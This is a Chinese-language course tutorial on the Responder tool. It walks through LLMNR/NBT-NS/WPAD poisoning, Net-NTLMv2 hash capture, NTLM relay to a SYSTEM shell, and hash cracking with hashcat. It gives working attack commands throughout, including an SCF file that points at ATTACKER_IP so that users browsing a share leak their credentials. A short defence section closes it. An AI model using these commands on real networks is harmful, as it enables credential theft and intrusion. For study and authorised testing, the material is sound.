# Responder 网络认证欺骗与凭据捕获完全指南

> 分类：工具指南 | 难度：进阶 | 阅读时间：约50分钟

## 概述

Responder 是内网渗透中最强大的凭证捕获工具之一。它利用 Windows 网络协议（LLMNR、NBT-NS、MDNS）的设计缺陷，通过欺骗响应来捕获网络中传输的 Net-NTLMv2 哈希。当 Windows 系统无法通过 DNS 解析主机名时，会退回使用 LLMNR/NBT-NS 广播查询——Responder 在此时冒充目标响应，诱导目标发送认证请求，从而捕获凭据哈希。

**核心能力**：
- 监听并响应 LLMNR/NBT-NS/MDNS 广播查询
- 搭建伪造的 SMB/HTTP/MSSQL/FTP/IMAP 等服务
- 捕获 Net-NTLMv2 哈希（可用于中继攻击或离线破解）
- 与 ntlmrelayx（Impacket）配合实现中继攻击
- 内置 HTTP 服务器可托管恶意文件

## 核心知识点

- LLMNR/NBT-NS/MDNS 协议欺骗原理
- Net-NTLMv2 哈希捕获与理解
- SMB/HTTP 伪造服务器配置
- 与 NTLM 中继的配合使用
- Responder 配置文件调优
- 防御：如何保护网络免受此类攻击

---

## 一、安装

### 1.1 Kali Linux（预装）

```bash
sudo responder -h
# 默认路径：/usr/share/responder/
```

### 1.2 Ubuntu/Debian

```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
sudo python3 -m pip install -r requirements.txt

# 或 apt 安装
sudo apt install responder -y
```

### 1.3 验证安装

```bash
responder --version
ls /usr/share/responder/
# 应包含：Responder.py, logs/, configs/
```

---

## 二、基本使用

### 2.1 基础监听

```bash
# 基本模式（捕获哈希 + 毒化广播）
sudo responder -I eth0

# 详细输出
sudo responder -I eth0 -v

# 仅分析模式（不毒化，仅监听）
sudo responder -I eth0 -A

# 仅毒化模式
sudo responder -I eth0 -P
```

### 2.2 输出解读

```bash
# 捕获的哈希保存在 /usr/share/responder/logs/
ls -la /usr/share/responder/logs/

# 文件命名：
# SMB-NTLMv2-SSP-10.0.0.5.txt    # 某IP发来的SMB Net-NTLMv2
# HTTP-NTLMv2-10.0.0.8.txt        # HTTP认证哈希
# Poisoners-Session.log           # 毒化活动日志
# Analyzer-Session.log            # 分析日志

# 查看捕获的哈希
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.0.0.5.txt
```

### 2.3 哈希格式解读

```
administrator::CORP:1122334455667788:AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH:0101000000000000ABCDEF...
|             |     |    |                  |                               |
|             用户名  域名 挑战值(Challenge)  NTLMv2-Response                 会话信息
```

---

## 三、服务配置

### 3.1 Responder.conf 配置

```bash
# 配置文件
sudo vim /usr/share/responder/Responder.conf

[Responder Core]
SQL = On           # 伪造 SQL 服务器
SMB = On           # 伪造 SMB 服务器
Kerberos = On      # Kerberos 认证
FTP = On           # FTP
POP = On           # POP3
SMTP = On          # SMTP
IMAP = On          # IMAP
HTTP = On          # HTTP 服务器
HTTPS = On         # HTTPS 服务器
DNS = On           # DNS 服务器
LDAP = On          # LDAP 服务器
DCE-RPC = On       # DCERPC
WinRM = On         # WinRM

; 挑战值（可自定义为固定值用于中继攻击）
Challenge = 1122334455667788

; HTTP 服务器
HTTP IP = 0.0.0.0
HTTP Port = 80

; HTTPS 服务器
HTTPS IP = 0.0.0.0
HTTPS Port = 443
```

### 3.2 禁用特定服务

```bash
# 场景：与 ntlmrelayx 配合使用
# Responder 只监听和毒化，不启动自己的 SMB/HTTP 服务器
# 编辑配置：
SMB = Off
HTTP = Off
HTTPS = Off
# 这些端口释放给 ntlmrelayx 使用

# 命令行方式（不需要改配置）
sudo responder -I eth0 -r -d -w
# -r: 禁用 SMB
# -d: 禁用 HTTP
# -w: 启用 WPAD 代理欺诈
```

---

## 四、实战场景

### 场景一：基础内网凭证捕获

```bash
# 1. 启动 Responder
sudo responder -I eth0 -v

# 2. 等待网络中的 Windows 主机尝试访问不存在的共享
# 例如用户误输入 \\notexist\share
# Windows 通过 LLMNR/NBT-NS 广播查找 "notexist"
# Responder 欺骗回复 → 目标发送 NTLMv2 认证

# 3. 查看捕获
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# 4. 破解哈希
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### 场景二：HTTP WPAD 代理欺诈

```bash
# 1. 启动（启用 WPAD）
sudo responder -I eth0 -w

# 2. Responder 响应 WPAD 查询，返回伪造的代理配置文件
# 目标浏览器/系统使用伪造代理 → 流量经过 Responder

# 3. 利用 WPAD 执行 NTLM 中继
sudo responder -I eth0 -r -d -w &
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 场景三：多接口监听

```bash
# 监听多个网段
sudo responder -I eth0 -I eth1 -v

# 监听所有接口
sudo responder -I ALL
```

### 场景四：针对性攻击（内网渗透）

```bash
# 1. 先扫描网络
sudo netdiscover -r 192.168.1.0/24

# 2. 启动 Responder 精准毒化
sudo responder -I eth0 -v -b

# 3. 在目标可访问的共享上放置 LNK 文件
# LNK 文件指向 \\<AttackIP>\share\icon.ico
# 当用户浏览共享时，自动尝试连接并认证

# 4. 捕获凭据并破解
```

### 场景五：配合 SCF 文件攻击

```bash
# 创建 SCF 文件（Shell Command File）
# 放在可写的网络共享上
echo "[Shell]" > attack.scf
echo "Command=2" >> attack.scf
echo "IconFile=\\\\<ATTACKER_IP>\\share\\icon.ico" >> attack.scf
echo "[Taskbar]" >> attack.scf
echo "Command=ToggleDesktop" >> attack.scf

# 当用户浏览包含此文件的文件夹时
# Windows 尝试加载图标 → 向攻击机发起 SMB 认证
# Responder 捕获 Net-NTLMv2 哈希
```

---

## 五、MultiRelay 攻击

### 5.1 基础中继

```bash
# MultiRelay.py 可以同时进行毒化+中继
cd /usr/share/responder/tools/

# 启动中继（将捕获的凭据中继到目标）
sudo python3 MultiRelay.py -t 10.0.0.10 -u ALL
# -t: 中继目标
# -u ALL: 中继所有用户

# 成功后在目标上获得 SYSTEM 权限 Shell
```

### 5.2 RunFinger 目标探测

```bash
# 先扫描目标是否启用了 SMB 签名
sudo python3 RunFinger.py -i 192.168.1.0/24
# 输出：
# 10.0.0.10 - OS: Windows 10 - SMB Signing: False → 可中继
# 10.0.0.5  - OS: Windows Server 2019 - SMB Signing: True → 不可中继
```

---

## 六、日志分析与报告

```bash
# 分析 Responder 日志
sudo python3 /usr/share/responder/tools/DumpHash.py

# 导出为 hashcat 格式
for f in /usr/share/responder/logs/*NTLMv2*.txt; do
    cat "$f" | grep "::" | tee -a all_hashes.txt
done

# 统计（去重）
sort -u all_hashes.txt -o unique_hashes.txt
wc -l unique_hashes.txt

# 分析IP分布
grep -oP '\d+\.\d+\.\d+\.\d+' all_hashes.txt | sort | uniq -c | sort -rn
```

---

## 七、防御措施

### 7.1 网络层防御

```
1. 禁用 LLMNR（本地链路多播名称解析）
   GPO: 计算机配置 → 管理模板 → 网络 → DNS客户端 → 关闭多播名称解析

2. 禁用 NBT-NS（NetBIOS over TCP/IP）
   - DHCP 选项禁用 NetBIOS
   - 或网卡属性 → IPv4 → 高级 → WINS → 禁用 NetBIOS

3. 启用 SMB 签名
   GPO: 计算机配置 → Windows设置 → 安全设置 → 本地策略 → 安全选项
   → Microsoft 网络服务器: 对通信进行数字签名(始终)

4. 启用 LDAP 签名和 LDAPS
5. 部署 WPAD 补丁（KB3165191）
```

### 7.2 检测规则

```bash
# 检测 Responder 活动
# 事件 ID 4624 + 异常认证来源
# 网络中异常的 LLMNR/NBT-NS 响应（可以用 Wireshark 分析）
# 检测特定端口（80/443/445/139/1433）的异常监听
# IDS 规则检测 Responder 特征
```

---

## 八、速查卡

```
基础监听:       sudo responder -I eth0
详细模式:       -v
分析模式:       -A（仅监听不毒化）
WPAD欺诈:       -w
HTTP服务:       On（Responder.conf）
SMB服务:        On（Responder.conf）
日志路径:       /usr/share/responder/logs/
MultiRelay:     python3 MultiRelay.py -t TARGET_IP -u ALL
指纹检测:       python3 RunFinger.py -i 192.168.1.0/24

哈希破解:
Net-NTLMv2:     hashcat -m 5600 hashes.txt wordlist.txt
John:           john --format=netntlmv2 hashes.txt

防御:
禁用 LLMNR:     GPO → 关闭多播名称解析
禁用 NBT-NS:    DHCP 选项 / 网卡属性
启用 SMB 签名:  GPO → 始终签名
```

---

> 📖 本文为"网安百宝箱"课程配套读物。
> 参考：Responder 官方 https://github.com/lgandx/Responder
> 更新于 2026-06-18
